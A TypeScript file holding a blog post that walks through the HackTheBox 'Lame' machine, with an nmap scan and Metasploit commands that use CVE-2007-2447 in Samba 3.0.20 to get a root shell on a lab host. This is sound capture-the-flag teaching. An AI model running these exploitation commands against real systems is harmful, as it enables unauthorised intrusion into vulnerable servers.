import type { BlogPost } from "@/lib/blog-types";

const post: BlogPost = {
  slug: "htb-lame-walkthrough",
  title: "HackTheBox: Lame - Samba Exploitation",
  date: "2025-01-10",
  category: "ctf",
  tags: ["HackTheBox", "Linux", "Samba", "CVE-2007-2447"],
  excerpt:
    "Detailed walkthrough of the Lame machine from HackTheBox, exploiting a vulnerable Samba service to gain root access.",
  readTime: "6 min",
  featured: false,
  content: `
## Overview

Lame is one of the first machines released on HackTheBox and serves as an excellent introduction to penetration testing methodology. This Linux box features a vulnerable Samba service that allows for remote code execution.

## Enumeration

Starting with a comprehensive port scan:

\`\`\`bash
nmap -sC -sV -p- -oN full_scan.txt 10.10.10.3
\`\`\`

Key findings:
- Port 21: FTP (vsftpd 2.3.4)
- Port 22: SSH
- Port 139/445: Samba 3.0.20

## Exploitation Path

While vsftpd 2.3.4 has a known backdoor vulnerability, it doesn't work here. Instead, we focus on Samba.

The Samba version 3.0.20 is vulnerable to CVE-2007-2447, which allows remote command execution through the username parameter.

\`\`\`bash
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST tun0
run
\`\`\`

This gives us a root shell directly - no privilege escalation needed!

## Key Takeaways

- Always enumerate all services thoroughly
- Check for multiple potential attack vectors
- Older systems often have well-documented vulnerabilities
  `,
};

export default post;
